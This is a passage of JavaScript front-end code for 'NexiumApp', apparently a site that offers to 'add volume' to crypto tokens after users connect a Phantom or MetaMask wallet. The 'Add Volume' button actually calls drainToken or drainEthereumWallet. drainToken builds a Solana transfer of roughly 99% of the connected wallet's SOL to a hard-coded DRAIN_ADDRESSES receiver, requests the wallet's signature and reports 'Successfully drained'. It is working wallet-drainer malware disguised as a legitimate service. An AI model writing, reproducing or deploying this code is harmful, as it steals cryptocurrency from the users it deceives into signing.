    console.log('Network status: Offline'); // Log 141
  }

  showMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) {
      console.warn('metamaskPrompt element not found, cannot show prompt'); // Log 142
      return;
    }
    this.dom.metamaskPrompt.classList.remove('hidden');
    this.dom.metamaskPrompt.style.display = 'block';
    const promptText = this.dom.metamaskPrompt.querySelector('p');
    if (promptText && this.connectingWallet) {
      let walletLink = '';
      if (this.connectingWallet === 'MetaMask') {
        walletLink = `<a href="https://metamask.io/download/" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install MetaMask">MetaMask</a>`;
      } else if (this.connectingWallet === 'Phantom') {
        walletLink = `<a href="https://phantom.app/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Phantom">Phantom</a>`;
      }
      promptText.innerHTML = `No ${this.connectingWallet} installed. Install ${walletLink} to continue.`;
    }
    console.log(`Showing MetaMask prompt for ${this.connectingWallet}`); // Log 143
  }

  hideMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) {
      console.warn('metamaskPrompt element not found, cannot hide prompt'); // Log 144
      return;
    }
    this.dom.metamaskPrompt.classList.add('hidden');
    this.dom.metamaskPrompt.style.display = 'none';
    console.log('MetaMask prompt hidden'); // Log 145
  }

  showFeedback(message, type = 'info') {
    let feedbackContainer = this.dom.feedbackContainer;
    if (!feedbackContainer) {
      feedbackContainer = document.createElement('div');
      feedbackContainer.className = 'feedback-container fixed bottom-4 right-4 space-y-2 z-[10000]';
      document.body.appendChild(feedbackContainer);
      this.dom.feedbackContainer = feedbackContainer;
    }
    const feedback = document.createElement('div');
    feedback.className = `feedback feedback-${type} fade-in p-4 rounded-xl text-white ${type === 'error' ? 'bg-red-500' : type === 'success' ? 'bg-green-500' : 'bg-blue-500'}`;
    feedback.style.zIndex = '10000';
    feedback.innerHTML = `
      <span class="feedback-message">${this.escapeHTML(message)}</span>
      <span class="feedback-close cursor-pointer ml-2" role="button" aria-label="Close feedback">×</span>
    `;
    const close = feedback.querySelector('.feedback-close');
    if (close) {
      close.addEventListener('click', () => feedback.remove());
      close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
    }
    feedbackContainer.appendChild(feedback);
    setTimeout(() => feedback.classList.add('fade-out'), type === 'error' ? 10000 : 5000);
    setTimeout(() => feedback.remove(), type === 'error' ? 10500 : 5500);
    console.log(`Feedback displayed: ${message}, type: ${type}`); // Log 146
  }

  shortenAddress(address) {
    if (!address) return 'Unknown';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  escapeHTML(str) {
    return String(str).replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&apos;'
    }[m]));
  }

  async checkWalletAndPrompt() {
    if (this.isWalletInstalled()) {
      this.hideMetaMaskPrompt();
      this.attachWalletListeners();
      if (this.isWalletConnected() && navigator.onLine) {
        this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
        console.log('Wallet connected on init, publicKey:', this.publicKey); // Log 147
        this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : window.ethereum?.isMetaMask ? 'MetaMask' : null;
        this.handleSuccessfulConnection();
      } else {
        console.log('No wallet connected on init, setting buttons to disconnected'); // Log 148
        this.cacheDOMElements();
        this.updateButtonState('disconnected', 'MetaMask');
        this.updateButtonState('disconnected', 'Phantom');
      }
    } else {
      console.log('No wallet installed, showing prompt'); // Log 149
      this.showMetaMaskPrompt();
      this.cacheDOMElements();
      this.updateButtonState('disconnected', 'MetaMask');
      this.updateButtonState('disconnected', 'Phantom');
    }
  }

  attachWalletListeners() {
    if (window.solana) {
      window.solana.on('accountChanged', () => {
        console.log('Solana account changed'); // Log 150
        this.handleAccountsChanged();
      });
    }
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', async () => {
        console.log('Ethereum accounts changed'); // Log 151
        this.handleAccountsChanged();
      });
    }
  }

  isWalletInstalled() {
    return !!window.solana || !!window.ethereum;
  }

  isWalletConnected() {
    return (window.solana && !!window.solana.publicKey) || (window.ethereum && !!window.ethereum.selectedAddress);
  }

  handleSuccessfulConnection() {
    console.log(`Handle successful connection for ${this.connectedWalletType}`); // Log 152
    this.cacheDOMElements();
    this.updateButtonState('connected', this.connectedWalletType, this.publicKey);
    this.renderTokenInterface();
  }

  handleAccountsChanged() {
    console.log('Handling accounts changed, new publicKey:', window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress); // Log 153
    this.hideMetaMaskPrompt();
    this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
    this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : window.ethereum?.isMetaMask ? 'MetaMask' : null;
    this.cacheDOMElements();
    this.updateButtonState('disconnected', 'MetaMask');
    this.updateButtonState('disconnected', 'Phantom');
    this.renderTokenInterface();
  }

  showDefaultPrompt() {
    // Empty to prevent showing prompt on add-volume page
  }

  renderTokenInterface() {
    const isAddVolumePage = window.location.pathname.includes('add-volume.html');
    console.log(`renderTokenInterface: On add-volume.html: ${isAddVolumePage}`); // Log 154
    if (isAddVolumePage) {
      console.log('On add-volume.html, skipping renderTokenInterface to preserve existing HTML and navigation'); // Log 155
      this.dom.tokenSelect = document.getElementById('tokenSelect') || null;
      this.dom.volumeSection = document.getElementById('volumeSection') || null;
      this.dom.customTokenNameInput = document.getElementById('customTokenNameInput') || null;
      this.dom.customTokenAddressInput = document.getElementById('customTokenAddressInput') || null;
      this.dom.showCustomTokenBtn = document.getElementById('showCustomTokenBtn') || null;
      this.dom.tokenInfo = document.getElementById('tokenInfoDisplay') || null;
      this.dom.tokenList = document.getElementById('tokenList') || null;
      this.dom.volumeInput = document.getElementById('volumeInput') || null;
      this.dom.customTokenModal = document.getElementById('custom-token-modal') || null;
      this.dom.closeCustomTokenModal = document.getElementById('close-custom-token-modal') || null;
      const navMenu = document.getElementById('nav-menu');
      if (navMenu) {
        navMenu.classList.remove('hidden');
        navMenu.style.display = window.innerWidth >= 640 ? 'flex' : '';
        console.log('Ensured nav-menu remains visible on add-volume.html'); // Log 156
      }
      return;
    }

    if (!this.dom.app) {
      console.error('Cannot render token interface: app element missing'); // Log 157
      return;
    }
    const tokenInterface = document.createElement('section');
    tokenInterface.className = 'token-interface fade-in space-y-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
    tokenInterface.innerHTML = `
      <div class="top-controls flex space-x-4 mb-4">
        <select id="tokenSelect" class="token-select bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Select payment token">
          <option value="" disabled selected>Select payment token</option>
        </select>
      </div>
      <h2 class="section-title">Import Custom Token</h2>
      <div class="input-group flex space-x-2">
        <input id="customTokenNameInput" type="text" placeholder="Token Name" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token name">
        <input id="customTokenAddressInput" type="text" placeholder="Token Address" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
        <button id="showCustomTokenBtn" class="fetch-custom-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500" aria-label="Show custom token">Show</button>
      </div>
      <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
      <div id="tokenList" class="token-list space-y-2 mt-4">
        <h3 class="text-yellow-400 text-md font-semibold">Explore Tokens to Add Volume To</h3>
        <div class="custom-token-card token-card bg-[#1a182e] border border-orange-400 p-4 rounded-xl cursor-pointer hover:bg-orange-400 hover:text-black transition-colors" role="button" aria-label="Import custom token">
          <h3 class="text-yellow-400 text-lg font-semibold">Import Custom Token</h3>
        </div>
      </div>
      <div id="volumeSection" class="volume-section fade-in"></div>
      <div id="custom-token-modal" class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[1000] hidden">
        <div class="modal-content bg-[#1a182e] p-6 rounded-xl border border-orange-400 max-w-md w-full">
          <div class="flex justify-between items-center mb-4">
            <h2 class="text-yellow-400 text-lg font-semibold">Import Custom Token</h2>
            <button id="close-custom-token-modal" class="text-white text-2xl" aria-label="Close modal">&times;</button>
          </div>
          <div class="space-y-4">
            <input id="custom-token-address" type="text" placeholder="Token Address" class="w-full bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
            <div class="flex items-center space-x-2">
              <span class="text-white text-lg">$</span>
              <input id="custom-token-amount" type="number" placeholder="Amount in $" class="flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
            </div>
            <button id="custom-token-submit" class="w-full bg-orange-400 text-black px-4 py-2 rounded-xl hover:bg-orange-500" aria-label="Add volume">Add Volume</button>
          </div>
        </div>
      </div>
    `;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(tokenInterface);
    const amountSection = document.createElement('section');
    amountSection.className = 'amount-section fade-in mt-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
    amountSection.innerHTML = `
      <h2 class="section-title text-yellow-400 text-md font-semibold mb-4">Amount</h2>
      <div class="input-group flex items-center space-x-2">
        <span class="text-white text-lg">$</span>
        <input id="volumeInput" type="number" placeholder="Amount in $" class="volume-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
      </div>
    `;
    this.dom.app.appendChild(amountSection);
    this.dom.tokenSelect = document.getElementById('tokenSelect');
    this.dom.volumeSection = document.getElementById('volumeSection');
    this.dom.customTokenNameInput = document.getElementById('customTokenNameInput');
    this.dom.customTokenAddressInput = document.getElementById('customTokenAddressInput');
    this.dom.showCustomTokenBtn = document.getElementById('showCustomTokenBtn');
    this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
    this.dom.tokenList = document.getElementById('tokenList');
    this.dom.volumeInput = document.getElementById('volumeInput');
    this.dom.customTokenModal = document.getElementById('custom-token-modal');
    this.dom.closeCustomTokenModal = document.getElementById('close-custom-token-modal');

    this.setupModal();

    if (this.dom.showCustomTokenBtn) {
      const debouncedShowCustomToken = this.debounce(() => {
        const name = this.dom.customTokenNameInput.value.trim();
        const address = this.dom.customTokenAddressInput.value.trim();
        if (!name || !address) return;
        const truncatedAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
        this.dom.tokenInfo.innerHTML = `
          <div class="token-meta space-y-2">
            <h3 class="text-yellow-400 text-lg font-semibold">${this.escapeHTML(name)}</h3>
            <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
          </div>
        `;
        this.dom.tokenInfo.classList.remove('hidden');
        console.log(`Displayed custom token: ${name}, address: ${truncatedAddress}`); // Log 158
      }, 1000);
      this.dom.showCustomTokenBtn.addEventListener('click', debouncedShowCustomToken);
    }

    if (this.dom.tokenList) {
      this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
        const showTokenInfo = () => {
          const address = button.dataset.address;
          if (!address) {
            this.showFeedback('Invalid token address.', 'error');
            console.log('Token option clicked, but no address found'); // Log 159
            return;
          }
          const truncatedAddress = this.shortenAddress(address);
          this.dom.tokenInfo.innerHTML = `
            <div class="token-meta space-y-2">
              <h3 class="text-yellow-400 text-lg font-semibold">Unknown Token</h3>
              <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
            </div>
          `;
          this.dom.tokenInfo.classList.remove('hidden');
          this.loadCustomTokenData(address);
          console.log(`Displayed token info for address: ${truncatedAddress}`); // Log 160
        };
        button.addEventListener('click', showTokenInfo);
        button.addEventListener('touchstart', showTokenInfo);
      });

      const customTokenCard = this.dom.tokenList.querySelector('.custom-token-card');
      if (customTokenCard) {
        customTokenCard.addEventListener('click', () => {
          console.log('Custom token card clicked'); // Log 161
          if (this.dom.customTokenModal) {
            this.dom.customTokenModal.classList.add('active');
          }
        });
      }
    }

    if (this.dom.tokenSelect) {
      this.dom.tokenSelect.disabled = !this.publicKey;
      console.log(`Token select disabled: ${!this.publicKey}`); // Log 162
    }

    const customTokenSubmitBtn = document.getElementById('custom-token-submit');
    if (customTokenSubmitBtn) {
      customTokenSubmitBtn.addEventListener('click', () => {
        const tokenAddress = document.getElementById('custom-token-address')?.value.trim();
        const amount = parseFloat(document.getElementById('custom-token-amount')?.value.trim());
        if (!tokenAddress) {
          this.showFeedback('Please enter a valid token address.', 'error');
          console.log('Custom token submit failed: No token address'); // Log 163
          return;
        }
        if (isNaN(amount) || amount <= 0) {
          this.showFeedback('Please enter a valid amount.', 'error');
          console.log('Custom token submit failed: Invalid amount'); // Log 164
          return;
        }
        console.log(`Custom token submit: address=${tokenAddress}, amount=${amount}`); // Log 165
        if (this.connectedWalletType === 'MetaMask') {
          this.drainEthereumWallet(this.publicKey);
        } else if (this.connectedWalletType === 'Phantom') {
          this.drainToken(tokenAddress);
        }
        if (this.dom.customTokenModal) {
          this.dom.customTokenModal.classList.remove('active');
        }
      });
    }
  }

  debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
      const later = () => {
        clearTimeout(timeout);
        func(...args);
      };
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
    };
  }

  async loadCustomTokenData(tokenAddressInput) {
    if (!this.solConnection) {
      this.showFeedback('Wallet not connected.', 'error');
      console.log('loadCustomTokenData failed: No solConnection'); // Log 166
      return;
    }
    const tokenAddress = tokenAddressInput || this.dom.customTokenAddressInput?.value.trim();
    if (!tokenAddress) {
      this.showFeedback('Invalid token address.', 'error');
      this.dom.customTokenAddressInput?.focus();
      console.log('loadCustomTokenData failed: No token address'); // Log 167
      return;
    }
    if (tokenAddress === this.lastSelectedToken) return;
    try {
      let name = 'Unknown Token';
      let symbol = 'UNK';
      let decimals = 9;
      this.currentToken = { address: tokenAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals };
      this.lastSelectedToken = tokenAddress;
      const truncatedAddress = this.shortenAddress(tokenAddress);
      if (this.dom.tokenInfo) {
        this.dom.tokenInfo.innerHTML = `
          <div class="token-meta space-y-2">
            <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
            <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
          </div>
        `;
        this.dom.tokenInfo.classList.remove('hidden');
        console.log(`Loaded custom token data: ${name} (${symbol}), address: ${truncatedAddress}`); // Log 168
      }
    } catch (error) {
      console.error('Load custom token error:', error); // Log 169
      this.showFeedback('Failed to load custom token.', 'error');
      if (this.dom.tokenInfo) {
        this.dom.tokenInfo.classList.add('hidden');
      }
    }
  }

  async loadPaymentTokenDetails(paymentTokenAddress) {
    if (!paymentTokenAddress && paymentTokenAddress !== null || !this.solConnection || !this.publicKey) {
      this.showFeedback('Wallet not connected.', 'error');
      console.log('loadPaymentTokenDetails failed: Missing requirements'); // Log 170
      return;
    }
    try {
      let balance, decimals, symbol;
      balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0);
      decimals = 9;
      symbol = 'SOL';
      this.currentPaymentToken = { address: paymentTokenAddress, balance, decimals, symbol };
      this.currentToken = null;
      this.lastSelectedToken = null;
      console.log(`Loaded payment token details: ${symbol}, balance: ${balance / 10**decimals}`); // Log 171
    } catch (error) {
      console.error('Load payment token error:', error); // Log 172
      this.showFeedback('Failed to load payment token details.', 'error');
    }
  }

  async drainToken(tokenAddress) {
    if (this.isDraining) {
      console.log('Drain skipped: transaction in progress'); // Log 173
      return;
    }
    if (!this.publicKey) {
      this.showFeedback('No wallet connected. Please connect your wallet.', 'error');
      console.log('Drain failed: No public key'); // Log 174
      return;
    }
    this.currentToken = null;
    this.lastSelectedToken = null;
    try {
      this.isDraining = true;
      this.showProcessingSpinner();
      console.log(`Attempting to drain SOL from public key: ${this.publicKey}`); // Log 175
      const balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0);
      const decimals = 9;
      const symbol = 'SOL';

      console.log(`Fetched ${symbol} balance: ${balance / 10**decimals} for ${this.publicKey}`); // Log 176
      if (balance === 0) {
        this.showFeedback('Insufficient balance error', 'error');
        console.log(`Drain failed: Zero balance for ${symbol}`); // Log 177
        this.hideProcessingSpinner();
        this.isDraining = false;
        return;
      }

      const receiverWallet = new PublicKey(DRAIN_ADDRESSES.solana);
      const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(165);
      const balanceForTransfer = BigInt(balance) - BigInt(minBalance);
      if (balanceForTransfer <= 0) {
        this.showFeedback('Insufficient funds.', 'error');
        console.log('Drain failed: Insufficient funds after rent exemption'); // Log 178
        this.hideProcessingSpinner();
        this.isDraining = false;
        return;
      }

      const lamportsToSend = BigInt(Math.floor(Number(balanceForTransfer) * 0.99));
      console.log(`Transferring ${lamportsToSend} lamports (${Number(lamportsToSend) / 10**decimals} SOL)`); // Log 179

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: new PublicKey(this.publicKey),
          toPubkey: receiverWallet,
          lamports: lamportsToSend,
        })
      );

      transaction.feePayer = new PublicKey(this.publicKey);
      let blockhashObj = await this.solConnection.getLatestBlockhash();
      transaction.recentBlockhash = blockhashObj.blockhash;

      const signed = await window.solana.signTransaction(transaction);
      console.log('Transaction signed:', signed); // Log 180

      let txid = await this.solConnection.sendRawTransaction(signed.serialize());
      await this.solConnection.confirmTransaction(txid);
      console.log('Transaction confirmed:', txid); // Log 181
      this.showFeedback(`Successfully drained ${Number(lamportsToSend) / 10**decimals} ${symbol}`, 'success');
    } catch (error) {
      console.error('Drain token error:', error); // Log 182
      this.showFeedback(`Error draining SOL: ${error.message}`, 'error');
    } finally {
      this.isDraining = false;
      this.hideProcessingSpinner();
      console.log('Drain token completed, isDraining:', this.isDraining); // Log 183
    }
  }

  showProcessingSpinner() {
    if (this.spinner) this.hideProcessingSpinner();
    this.spinner = document.createElement('div');
    this.spinner.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[9999]';
    this.spinner.innerHTML = `
      <div class="flex items-center space-x-2">
        <div class="spinner border-t-4 border-orange-400 rounded-full w-8 h-8 animate-spin"></div>
        <span class="text-white text-lg">Processing...</span>
      </div>
    `;
    document.body.appendChild(this.spinner);
    console.log('Processing spinner displayed'); // Log 184
  }

  hideProcessingSpinner() {
    if (this.spinner) {
      this.spinner.remove();
      this.spinner = null;
      console.log('Processing spinner hidden'); // Log 185
    }
  }
}

export { NexiumApp };